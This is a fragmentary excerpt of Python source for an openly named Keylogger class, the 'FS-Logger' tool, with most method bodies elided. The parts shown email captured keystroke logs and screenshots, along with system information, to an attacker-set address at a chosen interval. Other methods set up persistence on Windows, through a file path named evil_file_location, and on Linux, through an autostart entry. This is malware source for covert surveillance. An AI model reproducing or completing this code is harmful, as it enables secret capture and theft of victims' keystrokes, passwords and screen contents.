...
class Keylogger:
    ...
    def send_mail(self, message):
        try:
            message = "Subject: FS-Logger Reporting\n\n" + "Report From:\n\n" + self.system_info + "\n\nLogs:\n" + message
    ...
    def send_mail_with_attachment(self, files= None):
        try:
            ...
            msg['From'] = self.email
            msg['To'] = self.email  
            msg['Subject'] = "FS-Logger Reporting With Screenshot Attachments"
            text = "\nReport From:\n\n" + self.system_info 
    ...
    def become_persistent_on_windows(self, time_persistent):
        ...
        if not os.path.exists(evil_file_location):
            ...
            self.log = "** FS-logger started on Windows System ** "
    ...
    def become_persistent_on_linux(self, time_persistent):
        ...
        if not os.path.isfile(autostart_file):
            time.sleep(time_persistent)
            self.log = "** FS-logger started On Linux System **"
            try:
...
if __name__ == '__main__':
    ...
    interval = int(input("[?] Time Interval to Send Emails [DEFAULT: 180] : "))
